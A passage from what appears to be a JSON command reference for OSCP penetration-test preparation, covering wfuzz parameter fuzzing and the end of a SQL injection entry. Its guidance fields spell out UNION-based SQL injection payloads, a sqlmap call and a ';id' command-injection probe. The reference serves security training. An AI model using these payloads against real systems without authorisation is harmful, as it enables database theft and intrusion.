      "notes": "Try with both single and double quotes",
      "oscp_relevance": "high",
      "methodology_guidance": {
        "after_success": "Try UNION SELECT: ' UNION SELECT null,null,null-- Extract database version: ' UNION SELECT @@version,null,null-- Enumerate tables: ' UNION SELECT table_name,null FROM information_schema.tables-- Use sqlmap for automation: sqlmap -u '<URL>?param=value' admin'--"
      }
    },
    {
      "id": "wfuzz-params",
      "name": "Parameter Fuzzing",
      "category": "web",
      "command": "wfuzz -c -z file,<WORDLIST> --hc 404 '<URL>?FUZZ=test'",
      "description": "Discover hidden parameters",
      "tags": [
        "DIRECTORY_ENUMERATION",
        "DISCOVERY",
        "ENUM",
        "ENUMERATION",
        "FUZZ",
        "OSCP:MEDIUM",
        "WEB",
        "WFUZZ"
      ],
      "variables": [
        {
          "name": "<URL>",
          "description": "Target URL",
          "example": "http://192.168.1.100/page.php",
          "required": true
        },
        {
          "name": "<WORDLIST>",
          "description": "Parameter wordlist",
          "example": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Color output for better readability",
        "-z": "Payload source - 'file' for wordlist",
        "--hc": "Hide status codes (404 = not found)",
        "FUZZ": "Placeholder replaced by wordlist entries"
      },
      "success_indicators": [
        "C=200",
        "C=302",
        "different response length",
        "W!=0"
      ],
      "failure_indicators": [
        "0 Reqs/sec",
        "connection refused",
        "All responses filtered"
      ],
      "next_steps": [],
      "alternatives": [
        "burp-intruder"
      ],
      "notes": "Filter by response size or status code",
      "oscp_relevance": "medium",
      "methodology_guidance": {
        "after_success": "Test found parameters for injection: <URL>?<PARAM>=' Fuzz parameter values: wfuzz -z file,<WORDLIST> '<URL>?param=FUZZ' Check for IDOR: <URL>?<PARAM>=1,2,3... Test for command injection: <URL>?<PARAM>=;id"
      },
      "filled_example": "wfuzz -c -z file,/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 'http://192.168.1.100/page.php?FUZZ=test'"
    },
